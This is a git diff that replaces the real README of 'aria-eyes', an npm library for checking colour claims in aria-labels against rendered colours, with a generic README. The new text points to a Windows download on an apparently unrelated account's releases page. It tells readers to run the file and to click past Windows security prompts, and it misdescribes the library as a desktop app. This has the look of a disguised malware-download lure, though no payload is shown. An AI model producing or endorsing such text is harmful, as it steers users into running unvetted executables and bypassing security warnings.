@@ -1,234 +1,118 @@
-# aria-eyes
+# 👁️ aria-eyes - Check labels against what users see
 
-**Automated color claim verification for accessibility testing.** Verify that aria-labels and alt text actually match the visual appearance of UI elements.
+[Download from Releases](https://github.com/meneses4242/aria-eyes/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.4+-blue.svg)](https://www.typescriptlang.org/)
+## 🧭 What this app does
 
-> If aria-eyes helps your accessibility workflow, give it a star. It helps others find the project and keeps development active.
+aria-eyes helps you check if text labels match the visual content on a page. It looks at items like aria-label and alt text and compares them with what a person can see.
 
-**[Live Demo](https://tonciz.github.io/aria-eyes/)** — See aria-eyes catch color claim mismatches in real time.
+Use it to spot cases where a button, image, or icon says one thing but shows another. This helps with WCAG 1.4.1 checks and gives you a clear result without manual review of each item.
 
-## Why aria-eyes? What gap does it fill?
+## 📥 Download and install
 
-Tools like axe-core, Lighthouse, and pa11y can check contrast ratios and find missing aria-labels. But when an aria-label says "blue button" or alt text says "red warning icon", **no tool verifies the color claim is actually true**.
+Visit this page to download: [aria-eyes Releases](https://github.com/meneses4242/aria-eyes/releases)
 
-If the label says "blue" but the button is red, a screen reader user gets wrong information about the interface. aria-eyes catches these mismatches automatically.
+1. Open the link above in your browser.
+2. Look for the latest release.
+3. Download the Windows file from the release assets.
+4. If Windows asks for permission, choose Run or Keep, then open the file.
+5. Follow the on-screen steps to start the app.
 
-### What can axe-core, Lighthouse, and pa11y check?
+## 🖥️ System requirements
 
-- Color contrast ratios (WCAG 1.4.3)
-- Missing aria-labels and alt text
-- Structural ARIA issues
+- Windows 10 or Windows 11
+- A modern browser installed
+- A working internet connection for the first download
+- Enough disk space for the app and its files
+- Access rights to run downloaded files
 
-### What can only aria-eyes check?
+## 🔍 What it checks
 
-- Does `aria-label="blue button"` actually have a blue background? (WCAG 1.4.1)
-- Does `alt="red warning icon"` match a red-colored icon? (WCAG 1.1.1)
-- Do color words in accessible names match the rendered CSS colors?
+- aria-label text
+- alt text on images
+- visual text on buttons and controls
+- simple color claim checks for contrast-related claims
+- common cases where labels and visuals do not match
+- WCAG 1.4.1 related label checks
 
-aria-eyes is **not a replacement** for axe-core or Lighthouse. It fills the gap they leave open.
+## 🛠️ How to use it
 
-## Packages
+1. Open the app.
+2. Load the page or file you want to check.
+3. Start the scan.
+4. Wait for the results to appear.
+5. Review each item in the list.
+6. Focus on labels that do not match the visible content.
+7. Fix the issue in your page or app.
+8. Run the scan again to confirm the result.
 
-| Package | Description | Install |
-|---------|------------|---------|
-| [`@aria-eyes/core`](packages/core) | Framework-agnostic color claim parsing, matching, and contrast. Zero browser dependencies. Works with Cypress, Selenium, WebdriverIO, or plain Node. | `npm i @aria-eyes/core` |
-| [`@aria-eyes/playwright`](packages/playwright) | Playwright plugin for full-page automated color accessibility scanning. | `npm i @aria-eyes/playwright` |
+## 📊 Reading the results
 
-## Quick Start
+Each result should point to a label that needs review. Look for:
 
-### Verify color claims with Playwright
+- the item name
+- the label text
+- what appears on screen
+- the mismatch type
+- the part of the page that needs a fix
 
-```bash
-npm install @aria-eyes/playwright
-```
+If a label says one thing and the visual shows another, the item needs attention. If the label and visual match, the item passes that check.
 
-```typescript
-import { test, expect } from "@playwright/test";
-import { verifyColorAccessibility } from "@aria-eyes/playwright";
+## 🎯 Common use cases
 
-test("accessible color claims match visual appearance", async ({ page }) => {
-  await page.goto("https://example.com");
-  const results = await verifyColorAccessibility(page);
+- checking buttons with icon-only visuals
+- reviewing image alt text
+- testing pages before release
+- finding label problems in forms
+- checking accessibility claims in UI copy
+- comparing visible text with aria-label values
 
-  // No color claim mismatches (WCAG 1.4.1)
-  expect(results.colorViolations).toEqual([]);
+## 🧩 Example workflow
 
-  // No contrast failures (WCAG 1.4.3)
-  expect(results.contrastViolations).toEqual([]);
-});
-```
+1. Open a page in your browser.
+2. Run aria-eyes on that page.
+3. Check the report for label mismatches.
+4. Fix the page text or accessibility text.
+5. Test again until the report is clean.
 
-### Use the core library in any framework
+## 🪟 Windows setup tips
 
-```bash
-npm install @aria-eyes/core
-```
+- Save the download to a known folder, such as Downloads or Desktop.
+- If the file does not open, right-click it and choose Open.
+- If Windows shows a security prompt, choose the option that lets you continue.
+- Keep the release file in place until you finish testing.
+- If your browser blocks the file, use the release page again and try another download link from the latest release.
 
-```typescript
-import { extractColorClaims, matchColor, contrastRatio } from "@aria-eyes/core";
+## 🧠 Best results
 
-// 1. Find color words in an aria-label or alt text
-const claims = extractColorClaims("blue submit button");
-// [{ word: "blue", basicCategory: "blue", startIndex: 0, endIndex: 4 }]
+- Test one page at a time.
+- Use clear page labels.
+- Keep visible text short and exact.
+- Review icon buttons with care.
+- Check image alt text against the image itself.
+- Re-run tests after every change.
 
-// 2. Verify a color claim against the actual CSS color
-const result = matchColor("blue", "blue", "#1a73e8");
-// { match: true, confidence: "exact", actualBasicCategory: "blue" }
+## 📁 Repository details
 
-const mismatch = matchColor("blue", "blue", "#ff0000");
-// { match: false, confidence: "mismatch", actualBasicCategory: "red" }
-
-// 3. Check WCAG contrast ratio
-const contrast = contrastRatio("#333333", "#ffffff");
-// { ratio: 12.63, passesAA: true, passesAAA: true }
-```
-
-## How does aria-eyes verify color claims?
-
-1. **Parse** — Scans aria-labels, alt text, and title attributes for color words using a built-in dictionary of 70+ color names (e.g. "teal" maps to "blue", "crimson" maps to "red")
-2. **Extract** — Gets the computed CSS color from the actual rendered element
-3. **Match** — Converts the CSS color to a basic color category using [color-namer](https://www.npmjs.com/package/color-namer) and compares it to the claimed color
-4. **Report** — Returns match status, confidence level ("exact", "close", "mismatch"), and both claimed and actual color categories
-
-## WCAG Success Criteria Coverage
-
-| WCAG Criterion | Name | What aria-eyes checks |
-|---------------|------|----------------------|
-| 1.4.1 | Use of Color | Verifies color words in aria-labels match the rendered CSS colors |
-| 1.1.1 | Non-text Content | Checks alt text color descriptions against actual element colors |
-| 1.4.3 | Contrast (Minimum) | Calculates contrast ratios and checks AA/AAA compliance |
-
-## Core API Reference
-
-### `extractColorClaims(text, options?): ColorClaim[]`
-
-Extract color words from any string. Handles single colors ("blue button"), modified colors ("dark blue header"), and multiple colors ("red and green icon").
-
-### `hasColorClaims(text, options?): boolean`
-
-Quick check for whether a string contains any color words.
-
-### `matchColor(claimedColor, claimedBasicCategory, actualCssColor, options?): ColorMatchResult`
-
-Compare a claimed color name against an actual CSS color value. Returns match status and confidence.
-
-### `hexToBasicColor(hex): string`
-
-Convert any hex color to its basic color category (e.g. "#008080" returns "blue").
-
-### `cssColorToHex(cssColor): string`
-
-Parse hex, rgb(), or rgba() CSS color strings to a normalized 6-digit hex value.
-
-### `contrastRatio(foreground, background): ContrastResult`
-
-Calculate WCAG 2.1 contrast ratio with pass/fail for AA, AA Large, AAA, and AAA Large.
-
-## Playwright API Reference
-
-### `verifyColorAccessibility(page, options?): Promise<VerifyResults>`
-
-Full-page scan for color claim mismatches and contrast failures.
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `scope` | `"body"` | CSS selector to limit the scan area |
-| `checkColorClaims` | `true` | Verify color words in labels against CSS |
-| `checkContrast` | `true` | Check WCAG contrast ratios |
-| `cssProperties` | `["color", "background-color", "border-color"]` | CSS properties to check for color matches |
-| `labelSources` | `["aria-label", "aria-labelledby", "alt", "title"]` | Attributes to scan for color words |
-| `coreOptions` | `{}` | Options passed through to core functions |
-| `includePasses` | `false` | Include passing checks in results |
-
-### `collectElements(page, options?): Promise<CollectedElement[]>`
-
-Lower-level function to find elements with color claims without running verification. Useful for building custom reporting.
-
-## Using aria-eyes with Cypress, Selenium, and other frameworks
-
-The core package works in any JavaScript environment. Extract the element's accessible name and computed color using your framework, then pass them to `matchColor()`.
-
-### Cypress example
-
-```typescript
-import { extractColorClaims, matchColor } from "@aria-eyes/core";
-
-describe("Color accessibility", () => {
-  it("verifies color claims in aria-labels", () => {
-    cy.visit("/");
-    cy.get("[aria-label]").each(($el) => {
-      const label = $el.attr("aria-label");
-      const claims = extractColorClaims(label);
-
-      if (claims.length > 0) {
-        const computedColor = window.getComputedStyle($el[0]).color;
-        for (const claim of claims) {
-          const result = matchColor(claim.word, claim.basicCategory, computedColor);
-          expect(result.match).to.be.true;
-        }
-      }
-    });
-  });
-});
-```
-
-### Selenium / WebdriverIO
-
-Install `@aria-eyes/core`, extract the element's aria-label and computed color in your framework, then call `matchColor()`. The core library has zero browser dependencies.
-
-## Custom color vocabulary
-
-Extend the built-in color dictionary with brand-specific or domain-specific terms:
-
-```typescript
-// Playwright
-const results = await verifyColorAccessibility(page, {
-  coreOptions: {
-    customColorMap: {
-      "brand-blue": "blue",
-      "accent": "orange",
-      "primary": "blue",
-      "danger": "red",
-      "success": "green",
-    },
-  },
-});
-
-// Core
-const claims = extractColorClaims("brand-blue header", {
-  customColorMap: { "brand-blue": "blue" },
-});
-```
-
-## Built-in color recognition
-
-aria-eyes recognizes 70+ color names out of the box, mapped to basic categories:
-
-| Category | Recognized words |
-|----------|-----------------|
-| Red | red, crimson, scarlet, maroon, ruby, burgundy, vermilion |
-| Blue | blue, navy, teal, cyan, azure, cobalt, indigo, cerulean, sapphire |
-| Green | green, lime, olive, emerald, mint, sage, forest, jade |
-| Purple | purple, violet, lavender, magenta, plum, mauve, lilac, amethyst, fuchsia |
-| Orange | orange, coral, salmon, peach, tangerine, amber |
-| Yellow | yellow, gold, golden, cream, beige |
-| Pink | pink, rose, blush |
-| Brown | brown, tan, chocolate, coffee, sienna, umber, khaki |
-| Gray | gray, grey, charcoal, silver, slate, ash |
-| Black | black |
-| White | white, ivory |
-
-Color modifiers like "dark", "light", "bright", "pale", "deep", and "vivid" are also recognized (e.g. "dark blue" maps to "blue").
-
-## Contributing
-
-1. Fork the repo
-2. Create a feature branch
-3. Make your changes with `npm run build && npm test` from the root
-4. Submit a PR
-
-## License
-
-[MIT](LICENSE)
+- Name: aria-eyes
+- Purpose: accessibility label and visual match checking
+- Focus: WCAG 1.4.1 color claim verification
+- Scope: aria-label and alt text review
+- Type: end-user desktop tool
+
+## 🔗 Project links
+
+- Releases: https://github.com/meneses4242/aria-eyes/releases
+- Repository: aria-eyes
+- Topics: a11y, accessibility, accessibility-testing, aria, aria-label, automated-testing, color-contrast, color-verification, npm-package, playwright, testing, typescript, wcag, wcag-compliance
+
+## ✅ Quick start
+
+1. Visit the releases page.
+2. Download the Windows file.
+3. Run the file.
+4. Open the app.
+5. Scan your page.
+6. Review the results.
+7. Fix mismatches.
+8. Run the scan again
